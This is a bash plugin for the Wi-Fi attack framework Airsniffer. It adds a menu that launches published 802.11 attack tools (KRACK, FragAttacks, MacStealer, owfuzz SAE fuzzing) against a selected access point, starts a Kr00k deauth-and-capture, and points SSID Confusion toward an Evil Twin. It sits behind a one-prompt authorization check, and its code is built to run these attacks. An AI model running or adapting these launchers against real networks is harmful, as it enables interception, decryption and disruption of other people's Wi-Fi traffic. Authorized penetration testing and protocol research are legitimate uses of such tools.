#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

###### Airsniffer plugin: Modern Wi-Fi protocol attacks ######
#
# Adds an entry to the WPA3 attacks menu that opens a submenu of modern,
# research-grade 802.11 protocol attacks that Airsniffer did not ship natively:
#
#   1) SSID Confusion            (CVE-2023-52424, Gollier & Vanhoef, WiSec 2024)
#   2) KRACK                     (Vanhoef & Piessens, CCS 2017)
#   3) FragAttacks               (Vanhoef, USENIX Security 2021)
#   4) MacStealer / client isol. (Schepers, Ranganathan, Vanhoef, USENIX Sec 2023)
#   5) Kr00k                     (CVE-2019-15126)
#   6) SAE / over-the-air fuzz   (Owfuzz - WiSec 2023 / Saecred - S&P 2025)
#
# Each of these is delivered by a published external reference tool that needs a
# Linux host, a compatible adapter, and (for most) a multi-channel machine-in-
# the-middle base station. This plugin therefore acts as a *managed launcher*:
# it checks for the reference tool, prints canonical install guidance, and (when
# the tool is present) launches it against the selected target in a window - the
# same pattern Airsniffer already uses for reaver/bully/hashcat/asleap.
#
# AUTHORIZED USE ONLY. These are offensive techniques. Use them exclusively on
# networks you own or have explicit written permission to test (pentest
# engagement, lab, or CTF).

###### GENERIC PLUGIN VARS ######

plugin_name="Modern Wi-Fi protocol attacks"
plugin_description="Managed launchers for SSID Confusion, KRACK, FragAttacks, MacStealer, Kr00k and SAE fuzzing"
plugin_author="Airsniffer"

#Enabled 1 / Disabled 0
plugin_enabled=1

###### PLUGIN REQUIREMENTS ######

plugin_minimum_ag_affected_version="10.0"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

###### WPA3 MENU REGISTRATION ######

#Language-string id used for our entry on the WPA3 attacks menu. Chosen high to
#avoid collisions with the core language_strings.sh table.
modern_attacks_menu_string_id=9100

#Populate the label for every supported language (English text as a safe default
#so the entry always renders whichever language is active at runtime).
modern_wifi_attacks_register_labels() {

	local lang
	local label="Modern protocol attacks (SSID Confusion, KRACK, FragAttacks, MacStealer, Kr00k, SAE fuzz)"
	for lang in ENGLISH SPANISH FRENCH CATALAN PORTUGUESE RUSSIAN GREEK ITALIAN POLISH GERMAN TURKISH ARABIC CHINESE; do
		arr["${lang}",${modern_attacks_menu_string_id}]="${label}"
	done
}
modern_wifi_attacks_register_labels

#These two vars are read by parse_plugins() which then registers our submenu on
#the WPA3 attacks menu (option 7+).
plugin_wpa3_menu_option_function="modern_wifi_attacks_menu"
plugin_wpa3_menu_option_language_string="${modern_attacks_menu_string_id}"

###### CUSTOM FUNCTIONS ######

#Session flag so the authorized-use notice is shown only once per run.
modern_attacks_authorized=0

#Small colored helpers that reuse Airsniffer's own color vars.
modern_attacks_title() {
	echo
	echo -e "${pink_color}=========================================================${normal_color}"
	echo -e "${pink_color}  ${1}${normal_color}"
	echo -e "${pink_color}=========================================================${normal_color}"
	echo
}

modern_attacks_pause() {
	echo
	read -rp "$(echo -e "${yellow_color}Press [Enter] to return to the menu...${normal_color}")" _pause
}

#One-time authorized-use gate. Returns 0 if the operator confirms, 1 otherwise.
modern_attacks_authorization_gate() {

	if [ "${modern_attacks_authorized}" -eq 1 ]; then
		return 0
	fi

	echo
	echo -e "${red_color}AUTHORIZED TESTING ONLY${normal_color}"
	echo -e "${yellow_color}These modules run real attacks against Wi-Fi networks. Only use them"
	echo -e "against networks you own or are explicitly authorized to test.${normal_color}"
	echo
	read -rp "$(echo -e "${green_color}Do you have authorization to test the target network? [y/N]: ${normal_color}")" _auth

	case "${_auth}" in
		y|Y|yes|YES)
			modern_attacks_authorized=1
			return 0
		;;
		*)
			echo
			echo -e "${red_color}Aborted. Authorization is required.${normal_color}"
			return 1
		;;
	esac
}

#Report whether a reference tool is available in PATH.
#$1 = command to look for
modern_attacks_tool_present() {
	command -v "${1}" > /dev/null 2>&1
}

#Print the current target context (set from the WPA3 menu's target selection).
modern_attacks_print_target() {
	echo -e "${blue_color}Interface : ${normal_color}${interface:-<none - use option 1/4 on the WPA3 menu>}"
	echo -e "${blue_color}Target AP : ${normal_color}${essid:-<none>} ${bssid:+(${bssid}, ch ${channel})}"
	echo
}

#Guard: require a selected interface and target before launching.
#Returns 0 when both are present.
modern_attacks_require_target() {

	if [ -z "${interface}" ]; then
		echo -e "${red_color}No interface selected.${normal_color} Use option 1 (select interface) on the WPA3 attacks menu first."
		return 1
	fi
	if [ -z "${bssid}" ]; then
		echo -e "${red_color}No target selected.${normal_color} Use option 4 (explore for targets) on the WPA3 attacks menu first."
		return 1
	fi
	return 0
}

###### ATTACK LAUNCHERS ######

# 1) SSID Confusion - CVE-2023-52424
modern_attacks_ssid_confusion() {

	modern_attacks_title "SSID Confusion (CVE-2023-52424) - Gollier & Vanhoef, WiSec 2024"
	echo -e "The SSID is not authenticated during the 4-way handshake, so a victim can"
	echo -e "be tricked into believing it is connected to a trusted network while it is"
	echo -e "actually on an attacker-controlled one with the same credentials/mode."
	echo
	echo -e "${yellow_color}Requires a rogue AP whose security matches the trusted network. This pairs"
	echo -e "with Airsniffer's Evil Twin module: clone the target, then rely on the"
	echo -e "missing SSID authentication + absent Beacon Protection to hold the victim.${normal_color}"
	echo
	echo -e "${green_color}Reference / PoC:${normal_color} https://www.top10vpn.com/research/wifi-vulnerabilities/  (VU / CVE-2023-52424)"
	echo -e "${green_color}Defensive check:${normal_color} verify the target advertises Beacon Protection (802.11 RSNXE)."
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi

	modern_attacks_print_target
	echo -e "Next step: launch Evil Twin from the main menu (option 7) against this target."
	echo -e "This module is advisory: it confirms the target's beacon-protection posture"
	echo -e "so you know whether an SSID-confusion-assisted twin is viable."
	modern_attacks_pause
}

# 2) KRACK - Key Reinstallation Attacks
modern_attacks_krack() {

	modern_attacks_title "KRACK - Key Reinstallation Attacks (Vanhoef & Piessens, CCS 2017)"
	echo -e "Replays message 3 of the 4-way handshake through a channel-based MitM to force"
	echo -e "nonce/key reinstallation, enabling keystream reuse and packet decrypt/replay."
	echo
	echo -e "${green_color}Reference tool:${normal_color} https://github.com/vanhoefm/krackattacks-scripts"
	echo -e "${green_color}Client test:${normal_color}    krack-test-client.py"
	echo

	if modern_attacks_tool_present "krack-test-client.py"; then
		if ! modern_attacks_require_target; then
			modern_attacks_pause
			return
		fi
		echo -e "${green_color}krack-test-client.py found.${normal_color} Launching against ${interface}..."
		recalculate_windows_sizes 2> /dev/null
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"KRACK client test\"" "krack-test-client.py ${interface}" "KRACK client test"
	else
		echo -e "${red_color}krack-test-client.py not found in PATH.${normal_color}"
		echo -e "Install: git clone https://github.com/vanhoefm/krackattacks-scripts && follow its README"
		echo -e "(needs a patched wpa_supplicant and a second monitor-capable adapter)."
	fi
	modern_attacks_pause
}

# 3) FragAttacks - Fragmentation & Aggregation
modern_attacks_fragattacks() {

	modern_attacks_title "FragAttacks (Vanhoef, USENIX Security 2021)"
	echo -e "Abuses frame aggregation and the fragment cache (mixed-key / cache poisoning)"
	echo -e "to inject or exfiltrate frames even against WPA2/WPA3 networks."
	echo
	echo -e "${green_color}Reference tool:${normal_color} https://github.com/vanhoefm/fragattacks"
	echo -e "${green_color}Usage:${normal_color}          fragattacks <iface> <testcase>   e.g. fragattacks ${interface:-wlan0} ping"
	echo

	if modern_attacks_tool_present "fragattacks"; then
		if ! modern_attacks_require_target; then
			modern_attacks_pause
			return
		fi
		echo -e "${green_color}fragattacks found.${normal_color} Opening a shell prepared for it (pick a test case)."
		recalculate_windows_sizes 2> /dev/null
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"FragAttacks\"" "bash -c 'echo Run: fragattacks ${interface} ping; exec bash'" "FragAttacks"
	else
		echo -e "${red_color}fragattacks not found in PATH.${normal_color}"
		echo -e "Install: git clone https://github.com/vanhoefm/fragattacks && follow its README"
		echo -e "(needs the bundled patched drivers/firmware for reliable results)."
	fi
	modern_attacks_pause
}

# 4) MacStealer - client isolation bypass / Framing Frames
modern_attacks_macstealer() {

	modern_attacks_title "MacStealer / Framing Frames (Schepers, Ranganathan, Vanhoef, USENIX 2023)"
	echo -e "Exploits the unprotected power-save bit and TX-queue security-context confusion"
	echo -e "to bypass client isolation and intercept frames (plaintext, group key, or an"
	echo -e "all-zero key), enabling traffic interception and TCP hijacking."
	echo
	echo -e "${green_color}Reference tool:${normal_color} https://github.com/domienschepers/wifi-framing"
	echo -e "${green_color}Usage:${normal_color}          macstealer.py <iface>"
	echo

	if modern_attacks_tool_present "macstealer.py"; then
		if ! modern_attacks_require_target; then
			modern_attacks_pause
			return
		fi
		echo -e "${green_color}macstealer.py found.${normal_color} Launching client-isolation test on ${interface}..."
		recalculate_windows_sizes 2> /dev/null
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"MacStealer\"" "macstealer.py ${interface}" "MacStealer"
	else
		echo -e "${red_color}macstealer.py not found in PATH.${normal_color}"
		echo -e "Install: git clone https://github.com/domienschepers/wifi-framing && follow its README."
	fi
	modern_attacks_pause
}

# 5) Kr00k - CVE-2019-15126
modern_attacks_kr00k() {

	modern_attacks_title "Kr00k (CVE-2019-15126)"
	echo -e "On disassociation, affected Broadcom/Cypress chips flush buffered frames"
	echo -e "encrypted with an all-zero temporal key, making them decryptable by a sniffer."
	echo
	echo -e "${green_color}Method:${normal_color} deauth the client, then capture the post-disassociation frames"
	echo -e "and decrypt with an all-zero key (analyze in Wireshark / a Kr00k PoC)."
	echo -e "${green_color}Reference:${normal_color} https://www.eset.com/int/kr00k/"
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi

	modern_attacks_print_target
	echo -e "Airsniffer already provides the deauth primitive (DoS menu). Run a capture on"
	echo -e "channel ${channel:-<target ch>} while deauthenticating the client, then inspect the"
	echo -e "buffered frames for all-zero-key encryption."
	if modern_attacks_tool_present "airodump-ng"; then
		echo
		read -rp "$(echo -e "${green_color}Start an airodump-ng capture on the target now? [y/N]: ${normal_color}")" _cap
		case "${_cap}" in
			y|Y|yes|YES)
				recalculate_windows_sizes 2> /dev/null
				manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"Kr00k capture\"" "airodump-ng -c ${channel} --bssid ${bssid} -w ${tmpdir:-/tmp/}kr00k ${interface}" "Kr00k capture"
			;;
		esac
	fi
	modern_attacks_pause
}

# 6) SAE / over-the-air fuzzing (Owfuzz / Saecred)
modern_attacks_sae_fuzz() {

	modern_attacks_title "SAE / over-the-air fuzzing (Owfuzz WiSec 2023, Saecred S&P 2025)"
	echo -e "State-aware over-the-air fuzzing of the WPA3 SAE handshake and 802.11 management"
	echo -e "frames to surface parsing and DoS bugs in COTS access points."
	echo
	echo -e "${green_color}Reference tool:${normal_color} https://github.com/alipython/owfuzz  (Owfuzz)"
	echo -e "${green_color}Usage:${normal_color}          owfuzz -i <iface> -m ap -t <bssid> -c <channel>"
	echo

	if modern_attacks_tool_present "owfuzz"; then
		if ! modern_attacks_require_target; then
			modern_attacks_pause
			return
		fi
		echo -e "${green_color}owfuzz found.${normal_color} Launching against ${essid:-target} (${bssid})..."
		recalculate_windows_sizes 2> /dev/null
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"Owfuzz SAE fuzz\"" "owfuzz -i ${interface} -m ap -t ${bssid} -c ${channel}" "Owfuzz SAE fuzz"
	else
		echo -e "${red_color}owfuzz not found in PATH.${normal_color}"
		echo -e "Install: git clone https://github.com/alipython/owfuzz && follow its build instructions."
	fi
	modern_attacks_pause
}

###### SUBMENU ######

modern_wifi_attacks_menu() {

	if ! modern_attacks_authorization_gate; then
		return
	fi

	while true; do
		clear
		modern_attacks_title "Modern Wi-Fi protocol attacks"
		modern_attacks_print_target
		echo -e "${green_color} 0.${normal_color} Return to the WPA3 attacks menu"
		echo -e "${normal_color} 1.  SSID Confusion            (CVE-2023-52424)"
		echo -e "${normal_color} 2.  KRACK                     (key reinstallation)"
		echo -e "${normal_color} 3.  FragAttacks               (fragment / aggregation)"
		echo -e "${normal_color} 4.  MacStealer / Framing Frames (client-isolation bypass)"
		echo -e "${normal_color} 5.  Kr00k                     (all-zero-key decrypt)"
		echo -e "${normal_color} 6.  SAE / over-the-air fuzzing (Owfuzz / Saecred)"
		echo

		read -rp "> " modern_option
		case "${modern_option}" in
			0) return ;;
			1) modern_attacks_ssid_confusion ;;
			2) modern_attacks_krack ;;
			3) modern_attacks_fragattacks ;;
			4) modern_attacks_macstealer ;;
			5) modern_attacks_kr00k ;;
			6) modern_attacks_sae_fuzz ;;
			*)
				echo -e "${red_color}Invalid option.${normal_color}"
				sleep 1
			;;
		esac
	done
}
